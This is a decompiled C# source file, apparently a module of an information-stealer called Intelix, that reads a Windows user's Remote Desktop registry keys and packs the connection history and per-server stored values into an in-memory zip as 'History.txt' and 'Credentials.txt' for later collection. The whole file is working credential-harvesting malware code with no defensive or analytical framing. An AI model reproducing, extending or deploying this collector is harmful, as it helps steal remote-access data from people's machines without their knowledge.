using System;
using System.Text;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000050 RID: 80
	public class Rdp : ITarget
	{
		// Token: 0x06000103 RID: 259 RVA: 0x0000EFDC File Offset: 0x0000D1DC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "Software\\Microsoft\\Terminal Server Client";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
			bool flag = registryKey == null;
			if (!flag)
			{
				string text2 = "Rdp";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "RDP";
				RegistryKey registryKey2 = registryKey.OpenSubKey("Default");
				bool flag2 = registryKey2 != null;
				if (flag2)
				{
					StringBuilder stringBuilder = new StringBuilder();
					string[] valueNames = registryKey2.GetValueNames();
					foreach (string name in valueNames)
					{
						try
						{
							object value = registryKey2.GetValue(name);
							bool flag3 = value != null;
							if (flag3)
							{
								stringBuilder.AppendLine(value.ToString());
							}
						}
						catch
						{
						}
					}
					bool flag4 = stringBuilder.Length > 0;
					if (flag4)
					{
						string text3 = text2 + "\\History.txt";
						byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString() + "\n");
						zip.AddFile(text3.Replace('\\', '/'), bytes);
						counterApplications.Files.Add(text + "\\Default => " + text3.Replace('\\', '/'));
					}
				}
				RegistryKey registryKey3 = registryKey.OpenSubKey("Servers");
				bool flag5 = registryKey3 != null;
				if (flag5)
				{
					StringBuilder stringBuilder2 = new StringBuilder();
					string[] subKeyNames = registryKey3.GetSubKeyNames();
					string[] array2 = subKeyNames;
					int j = 0;
					while (j < array2.Length)
					{
						string text4 = array2[j];
						try
						{
							RegistryKey registryKey4 = registryKey3.OpenSubKey(text4);
							bool flag6 = registryKey4 == null;
							if (!flag6)
							{
								stringBuilder2.AppendLine(text4 + ":");
								string[] valueNames2 = registryKey4.GetValueNames();
								foreach (string text5 in valueNames2)
								{
									try
									{
										object value2 = registryKey4.GetValue(text5);
										byte[] array4 = value2 as byte[];
										bool flag7 = array4 != null;
										if (flag7)
										{
											string str = BitConverter.ToString(array4).Replace("-", "");
											stringBuilder2.AppendLine(text5 + ": " + str);
										}
										else
										{
											stringBuilder2.AppendLine(string.Format("{0}: {1}", text5, value2));
										}
									}
									catch
									{
									}
								}
								stringBuilder2.AppendLine();
							}
						}
						catch
						{
						}
						IL_24F:
						j++;
						continue;
						goto IL_24F;
					}
					bool flag8 = stringBuilder2.Length > 0;
					if (flag8)
					{
						string text6 = text2 + "\\Credentials.txt";
						byte[] bytes2 = Encoding.UTF8.GetBytes(stringBuilder2.ToString());
						zip.AddFile(text6.Replace('\\', '/'), bytes2);
						counterApplications.Files.Add(text + "\\Servers => " + text6.Replace('\\', '/'));
					}
				}
				bool flag9 = counterApplications.Files.Count > 0;
				if (flag9)
				{
					counterApplications.Files.Add(text2);
					counter.Applications.Add(counterApplications);
				}
			}
		}
	}
}
